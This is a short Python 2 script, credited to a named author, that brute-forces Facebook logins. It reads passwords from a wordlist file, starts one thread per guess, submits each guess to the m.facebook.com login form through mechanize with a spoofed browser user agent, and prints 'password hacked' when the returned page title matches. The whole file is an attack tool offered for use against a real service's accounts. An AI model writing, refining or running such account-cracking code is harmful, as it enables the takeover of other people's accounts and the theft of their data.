'''
author = Rajashekar Reddy Dasari
'''
import mechanize
from threading import Thread

def crack(usname , password):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US)     AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
    browser.open("http://m.facebook.com/")
    browser.select_form(nr=0)
    browser.form['email'] = usname
    browser.form['pass'] = password
    response = browser.submit()
    title = browser.title()
    if title == "Facebook":
        print "password hacked and password is : %s" % password
    else :
        print "wrong password : %s \n" % password

def Main():
    uname = raw_input("enter fb username :)  : ")
    fpasswords = str('fpassword.txt')
    pfile = open(fpasswords, "r")

    for line in pfile.readlines():
        password = line.strip('\n')
        t = Thread(target=crack, args=(uname, password))
        t.start()
    
if __name__ == '__main__':
    Main()
        
